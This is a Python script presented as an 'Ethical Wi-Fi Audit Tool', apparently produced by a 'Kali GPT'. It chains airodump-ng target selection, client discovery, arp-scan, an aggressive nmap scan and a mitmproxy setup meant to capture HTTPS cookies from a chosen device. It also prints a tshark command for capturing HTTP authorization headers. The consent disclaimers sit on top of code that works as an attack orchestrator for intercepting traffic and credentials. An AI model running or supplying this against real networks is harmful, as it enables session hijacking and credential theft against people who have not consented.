#!/usr/bin/env python3

"""
📡 Ethical Wi-Fi Audit Tool
Author: Kali GPT (https://www.xis10cial.com)
Purpose: Educational and ethical network testing toolkit
Note: ONLY use on lab environments with full control and consent

✅ Supported Ethical Attacks & Tests:
- 🔍 Wi-Fi Discovery (airodump-ng)
- 🎯 Client Tracking on AP
- 🧠 OS & Service Fingerprinting (nmap)
- 🕵️ HTTP/HTTPS Traffic Inspection (mitmproxy)
- 🍪 Cookie Capture (via mitmproxy + trusted CA)
- 🔑 Credential Interception (HTTP basic/form)
- 💉 Simulated ARP spoofing / MITM (manual extension)
- 🔌 DoS Simulation (e.g., deauth packets – NOT active here)
- 📲 Device Profiling by MAC/vendor
- 🧬 DNS Spoof Testing (optionally via bettercap)

These attacks are simulated or monitored for visibility, and must never be used outside authorized environments.
"""

import os
import subprocess
import time
import signal
import shutil
import sys

# ------------------ CONFIG ------------------ #
MITMPROXY_PORT = 8080
MONITOR_IFACE = "wlan0mon"
NORMAL_IFACE = "wlan0"
MITM_SCRIPT = "extract_cookies.py"
REQUIRED_TOOLS = ["airmon-ng", "airodump-ng", "nmap", "mitmdump", "arp-scan"]

# ------------------ UTILITIES ------------------ #
def banner():
    os.system("clear")
    print("""
███████╗████████╗ █████╗ ██╗     ██╗      █████╗ ██╗   ██╗████████╗
██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ██╔══██╗╚██╗ ██╔╝╚══██╔══╝
███████╗   ██║   ███████║██║     ██║     ███████║ ╚████╔╝    ██║   
╚════██║   ██║   ██╔══██║██║     ██║     ██╔══██║  ╚██╔╝     ██║   
███████║   ██║   ██║  ██║███████╗███████╗██║  ██║   ██║      ██║   
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   
                 Ethical Wi-Fi Audit Suite | Kali GPT 🔓
    """)
    print("[!] Educational Use Only | Must Have Consent")

def check_root():
    if os.geteuid() != 0:
        print("[!] Please run this tool as root using sudo.")
        sys.exit(1)

def install_missing_tools():
    for tool in REQUIRED_TOOLS:
        if shutil.which(tool) is None:
            print(f"[!] {tool} not found. Installing...")
            subprocess.call(["apt", "install", "-y", tool])

# ------------------ STEP 1: MONITOR MODE ------------------ #
def start_monitor():
    print("[*] Killing conflicting processes...")
    subprocess.call(["airmon-ng", "check", "kill"])
    print("[*] Starting monitor mode...")
    subprocess.call(["airmon-ng", "start", NORMAL_IFACE])

# ------------------ STEP 2: WIFI SCAN ------------------ #
def scan_wifi():
    print("[*] Launching airodump-ng to scan Wi-Fi networks...")
    print("[!] Press CTRL+C when target AP is visible")
    try:
        subprocess.call(["airodump-ng", MONITOR_IFACE])
    except KeyboardInterrupt:
        pass

# ------------------ STEP 3: TARGET INPUT ------------------ #
def select_ap():
    bssid = input("[?] Enter BSSID of target AP: ")
    channel = input("[?] Enter Channel: ")
    return bssid, channel

# ------------------ STEP 4: CLIENT DISCOVERY ------------------ #
def scan_clients(bssid, channel):
    print("[*] Scanning for clients on the AP (CTRL+C to stop)...")
    try:
        subprocess.call(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "target", MONITOR_IFACE])
    except KeyboardInterrupt:
        pass

# ------------------ STEP 5: ARP SCAN ------------------ #
def local_arp_scan():
    print("[*] Running arp-scan for live devices with IP and OS info...")
    try:
        result = subprocess.check_output(["arp-scan", "--interface=wlan0", "--localnet"]).decode()
        print("\nDiscovered Devices:")
        print(result)
    except subprocess.CalledProcessError as e:
        print("[!] arp-scan failed:", e)

# ------------------ STEP 6: ATTACK OPTIONS ------------------ #
def attack_menu():
    ip = input("[?] Enter target IP for attack module selection: ")
    while True:
        print("\nSelect an attack module to run against", ip)
        print("1. OS & Port Scan (Nmap)")
        print("2. MITM + HTTPS Cookie Capture (mitmproxy)")
        print("3. DNS Spoof Simulation (Bettercap setup)")
        print("4. HTTP Credentials Monitoring (TShark optional)")
        print("5. Exit")
        choice = input("Select an option [1-5]: ")

        if choice == "1":
            print(f"[*] Running Nmap OS/Service Scan on {ip}...")
            subprocess.call(["nmap", "-A", "-T4", ip])
        elif choice == "2":
            setup_mitmproxy()
        elif choice == "3":
            print("[!] DNS spoofing demo requires Bettercap and custom rules. Configure manually.")
        elif choice == "4":
            print("[!] Use TShark manually for HTTP basic auth capture:")
            print("    tshark -i wlan0 -Y 'http.authorization'")
        elif choice == "5":
            break
        else:
            print("[!] Invalid choice. Try again.")

# ------------------ STEP 7: HTTPS MITM ------------------ #
def setup_mitmproxy():
    print("[*] Setting up mitmproxy for HTTPS cookie capture...")
    subprocess.Popen(["mitmdump", "-p", str(MITMPROXY_PORT), "-s", MITM_SCRIPT])

    print("[!] Make sure to install mitmproxy CA on target: http://mitm.it")
    print("[*] Now capturing HTTPS traffic... press CTRL+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping MITM proxy")
        os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)

# ------------------ MAIN ------------------ #
def main():
    check_root()
    install_missing_tools()
    banner()
    start_monitor()
    scan_wifi()
    bssid, channel = select_ap()
    scan_clients(bssid, channel)
    local_arp_scan()
    attack_menu()

if __name__ == "__main__":
    main()
